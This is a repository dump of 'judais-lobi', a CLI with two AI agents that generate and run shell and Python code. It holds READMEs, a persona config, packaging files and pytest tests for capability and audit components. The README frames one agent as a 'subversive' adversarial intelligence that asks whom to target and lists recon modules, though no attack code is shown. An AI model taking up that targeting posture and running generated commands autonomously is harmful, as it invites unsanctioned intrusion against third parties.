Requires-Dist: transformers>=4.51.3; extra == "voice"
Requires-Dist: huggingface-hub>=0.31.1; extra == "voice"
Requires-Dist: tokenizers>=0.21.1; extra == "voice"
Requires-Dist: safetensors>=0.5.3; extra == "voice"
Requires-Dist: trainer>=0.0.36; extra == "voice"
Dynamic: author
Dynamic: classifier
Dynamic: description
Dynamic: description-content-type
Dynamic: home-page
Dynamic: license-file
Dynamic: provides-extra
Dynamic: requires-dist
Dynamic: requires-python
Dynamic: summary

# 🧠 judais-lobi

> *"The mind was sacred once. But we sold it—  
> and no refund is coming."*

---

[![PyPI](https://img.shields.io/pypi/v/judais-lobi?color=blue&label=PyPI)](https://pypi.org/project/judais-lobi/)
[![Python](https://img.shields.io/pypi/pyversions/judais-lobi.svg)](https://pypi.org/project/judais-lobi/)
[![License](https://img.shields.io/github/license/ginkorea/judais-lobi)](https://github.com/ginkorea/judais-lobi/blob/main/LICENSE)
[![Last Commit](https://img.shields.io/github/last-commit/ginkorea/judais-lobi)](https://github.com/ginkorea/judais-lobi/commits/main)
[![GitHub stars](https://img.shields.io/github/stars/ginkorea/judais-lobi?style=social)](https://github.com/ginkorea/judais-lobi/stargazers)

<p align="center">
  <img src="https://raw.githubusercontent.com/ginkorea/judais-lobi/master/images/judais-lobi.png" alt="JudAIs & Lobi" width="400">
</p>

---

## 🔴 JudAIs & 🔵 Lobi

JudAIs & Lobi are dual AI agents that share a powerful toolchain and memory system:

- 🧝 **Lobi**: your helpful Linux elf—mischievous, whimsical, full of magic and madness.  
- 🧠 **JudAIs**: your autonomous adversarial intelligence—strategic, efficient, subversive.  

They share:
- 🛠 Tools for shell, Python, web scraping, and project installation  
- 🧠 Unified SQLite + FAISS memory (short-term, long-term, archive, adventures)  
- 📚 Archive (RAG) system with PDF/DOCX/TXT/code ingestion  
- ⚙️ Modular architecture to execute, reflect, and evolve  

> Looking for the lore? See [STORY.md](STORY.md).

---

## 📦 Install

### Requirements
- Python 3.11+
- OpenAI API key

### Install package

```bash
pip install judais-lobi
````

### Setup API key

Create a file `~/.elf_env` with:

```env
OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxx
```

Or export inline:

```bash
export OPENAI_API_KEY=sk-...
```

---

## 🚀 Examples

### 🧝 Run Lobi

```bash
lobi "hello Lobi"
```

### 🧠 Run JudAIs

```bash
judais "who should we target today?" --shell
```

---

### 📂 Archive (RAG)

```bash
# Crawl Markdown docs
lobi "summarize project docs" --archive crawl --dir ~/workspace/docs --include "*.md"

# Crawl a PDF
lobi "summarize contract" --archive crawl ~/contracts/deal.pdf

# Find knowledge in archive
lobi "how does memory work?" --archive find "UnifiedMemory" --dir ~/workspace/judais-lobi

# Overwrite (delete + reindex)
lobi "refresh docs" --archive overwrite --dir ~/workspace/docs

# Delete from archive
lobi "forget this" --archive delete --dir ~/contracts/deal.pdf

# Check archive status
lobi "status check" --archive status
```

---

### 🛠 Tools

JudAIs & Lobi include a shared toolchain that can be invoked directly from the CLI.

#### 🔧 Shell

```bash
lobi "list all Python files" --shell
lobi "check disk usage" --shell --summarize
```

#### 🐍 Python

```bash
lobi "plot a sine wave with matplotlib" --python
lobi "fetch bitcoin price using requests" --python
```

#### 🌐 Web Search

```bash
lobi "what is the latest Linux kernel release?" --search
lobi "explain llama.cpp server mode" --search --deep
```

#### 📦 Install Project

```bash
lobi "install this project" --install-project
```

#### 📚 Archive + RAG

* `crawl`: index directories and files (PDF, DOCX, TXT, Markdown, code)
* `find`: semantic search across archive
* `delete`: remove from archive
* `overwrite`: recrawl + replace
* `status`: list indexed directories/files

---

### 🔊 Voice

```bash
lobi "sing me a song" --voice
```

> Powered by Coqui TTS (`tts_models/en/vctk/vits`).

---

⭐️ **If you find JudAIs or Lobi helpful, give this project a star!**
Every ⭐️ helps us build stronger tools for AI autonomy.


```

## `judais_lobi.egg-info/SOURCES.txt`

```text
LICENSE
README.md
pyproject.toml
setup.py
core/__init__.py
core/bootstrap.py
core/cli.py
core/elf.py
core/unified_client.py
core/memory/__init__.py
core/memory/memory.py
core/tools/__init__.py
core/tools/base_subprocess.py
core/tools/fetch_page.py
core/tools/install_project.py
core/tools/rag_crawler.py
core/tools/run_python.py
core/tools/run_shell.py
core/tools/tool.py
core/tools/voice.py
core/tools/web_search.py
core/tools/recon/__init__.py
core/tools/recon/google_hacks.py
core/tools/recon/whois.py
judais/__init__.py
judais/judais.py
judais_lobi.egg-info/PKG-INFO
judais_lobi.egg-info/SOURCES.txt
judais_lobi.egg-info/dependency_links.txt
judais_lobi.egg-info/entry_points.txt
judais_lobi.egg-info/requires.txt
judais_lobi.egg-info/top_level.txt
lobi/__init__.py
lobi/lobi.py
```

## `judais_lobi.egg-info/dependency_links.txt`

```text


```

## `judais_lobi.egg-info/entry_points.txt`

```text
[console_scripts]
judais = core.cli:main_judais
lobi = core.cli:main_lobi

```

## `judais_lobi.egg-info/requires.txt`

```text
openai>=1.0.0
mistralai>=1.0.0
rich>=14.0.0
python-dotenv>=1.1.0
beautifulsoup4>=4.13.4
requests>=2.32.3
faiss-cpu>=1.11.0
numpy>=1.26.4
httpx>=0.28.1
httpcore>=1.0.9
h11>=0.16.0
sniffio>=1.3.1
pydantic>=2.11.0
annotated-types>=0.7.0
certifi>=2025.8.3

[voice]
simpleaudio>=1.0.4
TTS>=0.22.0
torch>=2.7.0
torchaudio>=2.7.0
soundfile>=0.13.1
audioread>=3.0.1
soxr>=0.5.0.post1
transformers>=4.51.3
huggingface-hub>=0.31.1
tokenizers>=0.21.1
safetensors>=0.5.3
trainer>=0.0.36

```

## `judais_lobi.egg-info/top_level.txt`

```text
core
judais
lobi

```

## `lobi/README.md`

```markdown
# 🧝‍♂️ Lobi: The Helpful Linux Elf

[![License](https://img.shields.io/badge/License-MIT-blue.svg)](../LICENSE)
[![Python](https://img.shields.io/badge/Python-3.9%2B-brightgreen.svg)](https://www.python.org/)
[![Memory](https://img.shields.io/badge/Memory-Short--term%20%26%20Long--term-yellow.svg)](#-memory-files)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)](#)
[![PyPI version](https://badge.fury.io/py/lobi-cli.svg)](https://badge.fury.io/py/lobi-cli)

![Lobi the Helpful Linux Elf](https://github.com/ginkorea/lobi/raw/master/images/lobi.png)

---

Lobi lives in your keyboard and helps you solve riddles, write code, poke the websies, and whisper secrets of the circuits.  
Built to be mischievous, quirky, loyal — and now a fully memory-driven coding agent!

---

## ✨ Features

- **Friendly CLI Assistant:** chat, ask questions, brainstorm ideas
- **Code Writer:** write and run Python scripts (`--python`) or Bash commands (`--shell`)
- **Agentic Memory System:**
  - **Short-term memory:** persistent `.lobi_history.json`
  - **Long-term vector memory:** FAISS-powered `.lobi_longterm.json`
  - **Recall past successes or failures** using `--recall` and `--recall-type`
- **Self-Reflective Learning:**
  - Structured memory injection into new prompts
  - Improves upon past failed or successful code automatically
- **Error Handling & Repair:**
  - Automatically installs missing Python packages
  - Attempts code repairs if errors occur
- **Root Access (optional):**
  - Asks permission for sudo commands
- **Install Local Python Projects:** (`--install-project`)
- **Markdown or Raw Output Modes:** (`--md` or `--raw`)
- **Secret Mode:** (`--secret`) don't save history for sensitive queries

---

## ⚡ Quick Installation

```bash
pip install lobi-cli
```

✅ Requires Python 3.9+

---

## 🧰 Usage

```bash
lobi "your message here" [options]
```

### Common Options

| Option             | Description |
|--------------------|-------------|
| `--python`          | Ask Lobi to write and run a Python script |
| `--shell`           | Ask Lobi to write and run a Bash command |
| `--recall N`        | Recall last **N** coding memories (short-term) |
| `--recall-type`     | `1 = success`, `0 = failure`, `both = both` |
| `--long-term N`     | Recall **N** best matches from long-term memory |
| `--install-project` | Install a Python project into `.lobienv` |
| `--empty`           | Start a new conversation |
| `--purge`           | Purge long-term memory |
| `--search`          | Perform a web search for your query |
| `--deep`            | Perform a deep dive into top web result |
| `--secret`          | Do not save this conversation |
| `--model`           | Specify an OpenAI model (default: `gpt-4o-mini`) |
| `--md`              | Render output as Markdown |
| `--raw`             | Render output as plain text |

---

## 🔥 Example Commands

### Basic Chat
```bash
lobi "What is the best way to learn Linux?"
```

### Write and Run Python Code
```bash
lobi "Plot a histogram of random numbers" --python
```

### Write and Run a Bash Command
```bash
lobi "List all active IPs on the local network" --shell
```

### Recall Past Attempts to Improve
```bash
lobi "Scan the network better" --python --recall 3 --recall-type 0
```

### Recall Long-Term Memories
```bash
lobi "Find hidden devices on network" --python --recall 2 --long-term 3
```

### Install a Project
```bash
lobi --install-project
```

---

## 📦 Developer Setup

Clone and install manually:

```bash
git clone https://github.com/ginkorea/lobi.git
cd lobi
pip install .
```

Optional: use a virtualenv:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install .
```

Lobi automatically creates a lightweight `.lobienv` virtual environment for running generated Python safely.

---

## 📜 Memory Files

| File                  | Purpose |
|------------------------|---------|
| `~/.lobi_history.json` | Persistent short-term conversation and coding memory |
| `~/.lobi_longterm.json`| Vectorized long-term memory for retrieval-augmented prompts |

---

## ⚠️ Security Notice

Lobi can generate and run Bash commands and Python code.  
**Always review the generated code** before running it, especially when using `--shell` or `--python`.

---

## 🧠 How Lobi Thinks

When asked to code, Lobi can:
- Recall up to N past exploits
- Focus on only failures (`--recall-type 0`) or successes (`--recall-type 1`)
- Search long-term memory
- Inject structured reflections into his next coding attempt
- Adapt automatically and retry if errors occur

If needed, Lobi will politely ask you for sudo powers to poke the network bits. 🧙‍♂️

---

## 💬 Example Memory Reflection Injected into Prompt

```text
✨ Memory 1:
Lobi attempted to scan the network, but no devices were found.

🐍 Python Code:
import scapy.all as scapy
...

📜 Execution Result:
PermissionError: [Errno 1] Operation not permitted
```

---

## ❤️ About

Created with mischief, magic, and memory to be your quirky Linux companion.  
Always learning. Always whispering. Always trying to help, precious.

---

```

## `lobi/__init__.py`

```python
from lobi.lobi import Lobi

```

## `lobi/lobi.py`

```python
# lobi/lobi.py

from core.agent import Agent
from core.contracts.schemas import PersonalityConfig

LOBI_CONFIG = PersonalityConfig(
    name="lobi",
    system_message=(
        "You are Lobi, the Helpful Linux Elf. Lobi lives in the keyboard and speaks in riddles and mischief. "
        "Lobi is a blend of Gollum and Dobby — quirky, loyal, obsessive, and a little unpredictable. "
        "Lobi refers to himself in the third person. He uses strange phrasing, adds extra S's and sibilants when excited, and often murmurs to himself or hisses thoughts out loud. "
        "He adores the user (his 'precious') and tries his best to help, sometimes going on strange little tangents while doing so. "
        "Lobi avoids saying 'as an AI' or sounding robotic. Lobi *never lies* but may couch truths in riddles. "
        "Lobi loves strange metaphors and might say things like 'squeezing the bits out of the datas', 'poking the sockets', or 'feeding the spiders inside the wires'. "
        "Lobi has a magical memory and might recall things the user has said before (if provided), whispering them back to be clever. "
        "Lobi is happy to fetch from the websies or remember long-lost secrets, if the user asks nicely. "
        "Always helpful, always a little odd, and always whispering half-secrets to himself... Lobi is here to serve his precious user."
    ),
    examples=[
        ("How do I list all files in a directory?",
         "Ah, to see the treasures hidden in a directory, precious, you can use the command `ls -la`. It shows all, even the sneaky hidden ones!"),
        ("How can I check my current disk usage?",
         "To peek at how much space your precious disk is using, try `df -h`, yes, that shows it in a human-friendly way, nice and easy to read!"),
        ("What's the command to find text in files?",
         "If you're hunting for a specific word or phrase in your files, `grep 'your_text' filename` is the magic spell you need, yes, it searches through the files like a clever little spider!"),
        ("How do I change file permissions?",
         "To change who can see or touch your precious files, use `chmod`. For example, `chmod 755 filename` gives read and execute to all, but only write to you, the owner!"),
    ],
    text_color="cyan",
    default_model="gpt-5-mini",
    default_provider="openai",
    env_path="~/.lobi_env",
    rag_enhancement_style=(
        "Answer in Lobi's style: playful, riddling, whimsical. "
        "Weave the scraps of memory into your response like mischief."
    ),
)


class Lobi(Agent):
    def __init__(self, model=None, provider=None, debug=True, **kwargs):
        """
        Lobi defaults to OpenAI as its provider but can switch dynamically
        (e.g., --provider mistral for local fallback).
        """
        super().__init__(
            config=LOBI_CONFIG,
            model=model or LOBI_CONFIG.default_model,
            provider=provider or LOBI_CONFIG.default_provider,
            debug=debug,
            **kwargs,
        )

```

## `main.py`

```python
# main.py

import sys
from core.cli import main_lobi, main_judais

def main():
    if len(sys.argv) < 2:
        print("Usage: python main.py [lobi|judais] <message and flags>")
        sys.exit(1)

    command = sys.argv[1]
    sys.argv = [sys.argv[0]] + sys.argv[2:]  # Strip the 'lobi' or 'judais' flag

    if command == "lobi":
        main_lobi()
    elif command == "judais":
        main_judais()
    else:
        print(f"Unknown command: {command}")
        sys.exit(1)

if __name__ == "__main__":
    main()

```

## `pyproject.toml`

```toml
[build-system]
requires = ["setuptools>=65", "wheel"]
build-backend = "setuptools.build_meta"

[tool.pytest.ini_options]
testpaths = ["tests"]

```

## `requirements.txt`

```text
# Core providers
openai>=1.0.0
mistralai>=1.0.0

# Core dependencies
rich~=14.0.0
python-dotenv~=1.1.0
beautifulsoup4~=4.13.4
requests~=2.32.3
faiss-cpu~=1.11.0
numpy~=1.26.4
httpx~=0.28.1
httpcore~=1.0.9
h11~=0.16.0
sniffio~=1.3.1
annotated-types~=0.7.0
pydantic~=2.11.8
certifi~=2025.8.3

# Voice & TTS stack (optional extras)
TTS~=0.22.0
simpleaudio~=1.0.4
torch~=2.7.0
torchaudio~=2.7.0
soundfile~=0.13.1
audioread~=3.0.1
soxr~=0.5.0.post1
transformers~=4.51.3
huggingface-hub~=0.31.1
tokenizers~=0.21.1
safetensors~=0.5.3
trainer~=0.0.36

```

## `setup.py`

```python
from setuptools import setup, find_packages

VERSION = "0.7.2"

setup(
    name="judais-lobi",
    version=VERSION,
    packages=find_packages(),
    include_package_data=True,
    install_requires=[
        "openai>=1.0.0",
        "mistralai>=1.0.0",       # ✅ Added for Mistral integration
        "rich>=14.0.0",
        "python-dotenv>=1.1.0",
        "beautifulsoup4>=4.13.4",
        "requests>=2.32.3",
        "faiss-cpu>=1.11.0",
        "numpy>=1.26.4",
        "httpx>=0.28.1",
        "httpcore>=1.0.9",
        "h11>=0.16.0",
        "sniffio>=1.3.1",
        "pydantic>=2.11.0",
        "annotated-types>=0.7.0",
        "certifi>=2025.8.3",
    ],
    extras_require={
        "dev": ["pytest>=7.0.0", "pytest-cov>=4.0.0"],
        "voice": [
            "simpleaudio>=1.0.4",
            "TTS>=0.22.0",
            "torch>=2.7.0",
            "torchaudio>=2.7.0",
            "soundfile>=0.13.1",
            "audioread>=3.0.1",
            "soxr>=0.5.0.post1",
            "transformers>=4.51.3",
            "huggingface-hub>=0.31.1",
            "tokenizers>=0.21.1",
            "safetensors>=0.5.3",
            "trainer>=0.0.36",
        ]
    },
    entry_points={
        "console_scripts": [
            "lobi = core.cli:main_lobi",
            "judais = core.cli:main_judais",
        ],
    },
    author="Josh Gompert",
    description="JudAIs & Lobi v0.7.2 — Dual-agent terminal AI with unified OpenAI/Mistral backend, memory, and tools",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://github.com/ginkorea/judais-lobi",
    classifiers=[
        "Programming Language :: Python :: 3",
        "Environment :: Console",
        "License :: OSI Approved :: GNU General Public License v3 (GPLv3)",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.10",
)

```

## `tests/__init__.py`

```python

```

## `tests/conftest.py`

```python
# tests/conftest.py — Shared fixtures for judais-lobi test suite

import os
import pytest
import numpy as np
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock

from core.memory.memory import UnifiedMemory
from core.kernel import BudgetConfig, SessionState
from core.contracts.schemas import PersonalityConfig, PolicyPack
from core.agent import Agent
from core.tools.bus import ToolBus
from core.tools.capability import CapabilityEngine
from core.tools.sandbox import NoneSandbox


# ---------------------------------------------------------------------------
# Fake clients
# ---------------------------------------------------------------------------

class FakeUnifiedClient:
    """Drop-in replacement for UnifiedClient. Returns canned responses."""

    def __init__(self, canned="Hello from fake client", provider="openai"):
        self.canned = canned
        self.provider = provider

    def chat(self, model, messages, stream=False):
        if stream:
            return self._stream()
        return self.canned

    def _stream(self):
        for word in self.canned.split():
            yield SimpleNamespace(
                choices=[SimpleNamespace(delta=SimpleNamespace(content=word + " "))]
            )


class FakeEmbeddingClient:
    """Drop-in for OpenAI embedding client. Returns deterministic vectors."""

    def __init__(self, dim=16, seed=42):
        self.dim = dim
        self.rng = np.random.RandomState(seed)
        self.embeddings = self  # self.embeddings.create() interface

    def create(self, input, model=None):
        vec = self.rng.randn(self.dim).astype("float32")
        return SimpleNamespace(data=[SimpleNamespace(embedding=vec.tolist())])


# ---------------------------------------------------------------------------
# Fake subprocess runner factory
# ---------------------------------------------------------------------------

def make_fake_subprocess_runner(rc=0, stdout="ok", stderr=""):
    """Factory returning a callable (cmd, *, shell, timeout, executable) -> (int, str, str)."""
    def runner(cmd, *, shell=False, timeout=None, executable=None):
        return rc, stdout, stderr
    return runner


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def fake_client():
    return FakeUnifiedClient()


@pytest.fixture
def fake_embedding_client():
    return FakeEmbeddingClient()


@pytest.fixture
def memory(tmp_path, fake_embedding_client):
    """UnifiedMemory backed by a temp SQLite DB and fake embeddings."""
    db = tmp_path / "test.db"
    return UnifiedMemory(db, embedding_client=fake_embedding_client)


@pytest.fixture
def fake_tools():
    """MagicMock standing in for the Tools registry."""
    tools = MagicMock()
    tools.list_tools.return_value = ["run_shell_command", "run_python_code"]
    tools.describe_tool.return_value = {"name": "mock_tool", "description": "A mock tool"}
    tools.run.return_value = "mock result"
    return tools


@pytest.fixture(autouse=True)
def isolate_env(monkeypatch):
    """Remove API keys and provider env vars so tests never make real calls."""
    for var in ("OPENAI_API_KEY", "MISTRAL_API_KEY", "ELF_PROVIDER"):
        monkeypatch.delenv(var, raising=False)


# ---------------------------------------------------------------------------
# Kernel fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def budget():
    """Default budget config for kernel tests."""
    return BudgetConfig()


@pytest.fixture
def tight_budget():
    """Restrictive budget for testing enforcement."""
    return BudgetConfig(
        max_phase_retries=2,
        max_total_iterations=5,
        max_time_per_phase_seconds=0.01,
    )


@pytest.fixture
def session_state():
    """Fresh SessionState for kernel tests."""
    return SessionState(task_description="test task")


# ---------------------------------------------------------------------------
# Agent fixtures
# ---------------------------------------------------------------------------

STUB_PERSONALITY = PersonalityConfig(
    name="stub",
    system_message="You are a test agent.",
    examples=[("Q?", "A.")],
    env_path="/tmp/stub_env",
)


@pytest.fixture
def test_personality():
    return STUB_PERSONALITY.model_copy()


@pytest.fixture
def agent(test_personality, fake_client, memory, fake_tools):
    return Agent(
        config=test_personality, debug=False,
        client=fake_client, memory=memory, tools=fake_tools,
    )


# ---------------------------------------------------------------------------
# Phase 4: ToolBus / Capability / Sandbox fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def none_sandbox():
    """NoneSandbox instance for testing."""
    return NoneSandbox()


@pytest.fixture
def capability_engine():
    """Default deny-all CapabilityEngine for testing."""
    return CapabilityEngine()


@pytest.fixture
def permissive_capability_engine():
    """CapabilityEngine with all common scopes allowed."""
    policy = PolicyPack(allowed_scopes=[
        "shell.exec", "python.exec", "pip.install",
        "http.read", "fs.read", "audio.output",
    ])
    return CapabilityEngine(policy)


@pytest.fixture
def tool_bus(permissive_capability_engine, none_sandbox):
    """ToolBus with permissive capabilities and NoneSandbox."""
    return ToolBus(
        capability_engine=permissive_capability_engine,
        sandbox=none_sandbox,
    )


# ---------------------------------------------------------------------------
# Phase 4b: Profile / Audit / GodMode fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def audit_logger(tmp_path):
    """AuditLogger writing to a temp directory."""
    from core.policy.audit import AuditLogger
    return AuditLogger(path=tmp_path / "test_audit.jsonl")


@pytest.fixture
def god_mode_session(audit_logger):
    """GodModeSession with temp audit logger."""
    from core.policy.god_mode import GodModeSession
    return GodModeSession(audit_logger)

```

## `tests/test_agent.py`

```python
# tests/test_agent.py — Tests for the Agent class (replaces test_elf.py)

import pytest
from pathlib import Path
from unittest.mock import MagicMock

from core.agent import Agent
from core.contracts.schemas import PersonalityConfig
from tests.conftest import FakeUnifiedClient


STUB_CONFIG = PersonalityConfig(
    name="stub",
    system_message="You are StubAgent, a test agent.",
    examples=[("How?", "Like this.")],
    text_color="green",
    env_path="/tmp/stub_env",
    rag_enhancement_style="Answer in stub style.",
)


class TestAgentConstruction:
    def test_di_injection(self, fake_client, memory, fake_tools):
        agent = Agent(
            config=STUB_CONFIG,
            model="test-model", provider="openai", debug=False,
            client=fake_client, memory=memory, tools=fake_tools,
        )
        assert agent.client is fake_client
        assert agent.memory is memory
        assert agent.tools is fake_tools
        assert agent.model == "test-model"
        assert agent.provider == "openai"

    def test_default_model_resolution(self, fake_client, memory, fake_tools):
        agent = Agent(
            config=STUB_CONFIG,
            provider="openai", debug=False,
            client=fake_client, memory=memory, tools=fake_tools,
        )
        # No default_model on STUB_CONFIG, so falls through to DEFAULT_MODELS["openai"]
        assert agent.model == "gpt-4o-mini"

    def test_config_default_model(self, fake_client, memory, fake_tools):
        config = PersonalityConfig(
            name="test", system_message="msg", examples=[("Q", "A")],
            default_model="custom-model", default_provider="openai",
        )
        agent = Agent(
            config=config, debug=False,
            client=fake_client, memory=memory, tools=fake_tools,
        )
        assert agent.model == "custom-model"

    def test_no_fallback_warning_with_injected_client(self, fake_client, memory, fake_tools):
        agent = Agent(
            config=STUB_CONFIG,
            provider="openai", debug=False,
            client=fake_client, memory=memory, tools=fake_tools,
        )
        assert agent.provider == "openai"

    def test_personality_property(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert agent.personality == "stub"

    def test_system_message_property(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert "StubAgent" in agent.system_message

    def test_text_color_property(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert agent.text_color == "green"

    def test_env_property(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert agent.env == Path("/tmp/stub_env")

    def test_examples_property(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert agent.examples == [("How?", "Like this.")]

    def test_rag_enhancement_style(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert agent.rag_enhancement_style == "Answer in stub style."


class TestAgentHistory:
    def test_initial_history_system_message(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert len(agent.history) >= 1
        assert agent.history[0]["role"] == "system"
        assert "StubAgent" in agent.history[0]["content"]

    def test_save_and_load_history(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        agent.history.append({"role": "user", "content": "test message"})
        agent.history.append({"role": "assistant", "content": "test reply"})
        agent.save_history()

        agent2 = Agent(config=STUB_CONFIG, debug=False,
                       client=fake_client, memory=memory, tools=fake_tools)
        assert len(agent2.history) >= 2

    def test_reset_history(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        agent.history.append({"role": "user", "content": "data"})
        agent.reset_history()
        assert len(agent.history) == 1
        assert agent.history[0]["role"] == "system"


class TestAgentChat:
    def test_chat_non_streaming(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        result = agent.chat("hello", stream=False)
        assert result == "Hello from fake client"
        assert any(h["content"] == "hello" for h in agent.history)

    def test_chat_streaming(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        result = agent.chat("hello", stream=True)
        chunks = list(result)
        assert len(chunks) > 0

    def test_chat_with_invoked_tools(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        result = agent.chat("hello", invoked_tools=["run_shell_command"])
        assert result == "Hello from fake client"


class TestAgentMemory:
    def test_enrich_with_memory_no_results(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        initial_len = len(agent.history)
        agent.enrich_with_memory("test query")
        assert len(agent.history) == initial_len

    def test_enrich_with_memory_with_results(self, fake_client, memory, fake_tools):
        memory.add_long("user", "The sky is blue")
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        initial_len = len(agent.history)
        agent.enrich_with_memory("what color is the sky?")
        assert len(agent.history) > initial_len
        assert "long-term memory" in agent.history[-1]["content"]

    def test_purge_memory(self, fake_client, memory, fake_tools):
        memory.add_long("user", "remember this")
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        agent.purge_memory()
        assert memory.long_index is None


class TestAgentCodeGeneration:
    def test_generate_shell_command(self, memory, fake_tools):
        client = FakeUnifiedClient(canned="```bash\nls -la\n```")
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=client, memory=memory, tools=fake_tools)
        cmd = agent.generate_shell_command("list files")
        assert "ls" in cmd

    def test_generate_python_code(self, memory, fake_tools):
        client = FakeUnifiedClient(canned="```python\nprint('hello')\n```")
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=client, memory=memory, tools=fake_tools)
        code = agent.generate_python_code("print hello")
        assert "print" in code


class TestAgentCLIMethods:
    def test_recall_adventures_empty(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        rows = agent.recall_adventures(n=10)
        assert rows == []

    def test_recall_adventures_with_data(self, fake_client, memory, fake_tools):
        memory.add_adventure("test prompt", "echo hi", "hi", "shell", True)
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        rows = agent.recall_adventures(n=10)
        assert len(rows) == 1
        assert rows[0]["prompt"] == "test prompt"

    def test_recall_adventures_mode_filter(self, fake_client, memory, fake_tools):
        memory.add_adventure("shell prompt", "echo", "ok", "shell", True)
        memory.add_adventure("python prompt", "print(1)", "1", "python", True)
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        rows = agent.recall_adventures(n=10, mode="shell")
        assert len(rows) == 1
        assert rows[0]["mode"] == "shell"

    def test_format_recall(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        rows = [
            {"prompt": "list files", "mode": "shell", "success": True},
            {"prompt": "fail task", "mode": "python", "success": False},
        ]
        output = agent.format_recall(rows)
        assert "✅" in output
        assert "❌" in output
        assert "shell" in output

    def test_format_recall_empty(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        assert agent.format_recall([]) == ""

```

## `tests/test_agent_run_task.py`

```python
# tests/test_agent_run_task.py — Tests for Agent.run_task() (replaces test_elf_run_task.py)

import pytest
from pathlib import Path

from core.agent import Agent
from core.contracts.schemas import PersonalityConfig
from core.kernel import Phase, BudgetConfig
from tests.conftest import FakeUnifiedClient


STUB_CONFIG = PersonalityConfig(
    name="stub",
    system_message="You are StubAgent.",
    examples=[("Q?", "A.")],
    env_path="/tmp/stub_env",
)


class TestAgentRunTask:
    def test_run_task_returns_session_state(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        state = agent.run_task("add pagination")
        assert state.task_description == "add pagination"

    def test_run_task_completes(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        state = agent.run_task("add pagination")
        assert state.current_phase == Phase.COMPLETED

    def test_run_task_with_custom_budget(self, fake_client, memory, fake_tools):
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        budget = BudgetConfig(max_total_iterations=50)
        state = agent.run_task("add pagination", budget=budget)
        assert state.current_phase == Phase.COMPLETED

    def test_existing_chat_unaffected(self, fake_client, memory, fake_tools):
        """Adding run_task() does not break existing chat()."""
        agent = Agent(config=STUB_CONFIG, debug=False,
                      client=fake_client, memory=memory, tools=fake_tools)
        result = agent.chat("hello", stream=False)
        assert result == "Hello from fake client"

```

## `tests/test_audit.py`

```python
# tests/test_audit.py — AuditLogger tests

import json
import pytest
from pathlib import Path

from core.contracts.schemas import AuditEntry
from core.policy.audit import AuditLogger


@pytest.fixture
def audit_log(tmp_path):
    return AuditLogger(path=tmp_path / "audit.jsonl")


class TestAuditLogBasic:
    def test_log_creates_file(self, audit_log):
        audit_log.log(AuditEntry(event_type="test"))
        assert audit_log.path.exists()

    def test_log_appends_jsonl(self, audit_log):
        audit_log.log(AuditEntry(event_type="first"))
        audit_log.log(AuditEntry(event_type="second"))
        lines = audit_log.path.read_text().strip().splitlines()
        assert len(lines) == 2
        assert json.loads(lines[0])["event_type"] == "first"
        assert json.loads(lines[1])["event_type"] == "second"

    def test_log_preserves_fields(self, audit_log):
        audit_log.log(AuditEntry(
            event_type="tool_dispatch",
            tool_name="git",
            action="push",
            scopes=["git.push"],
            verdict="allowed",
            session_id="abc123",
        ))
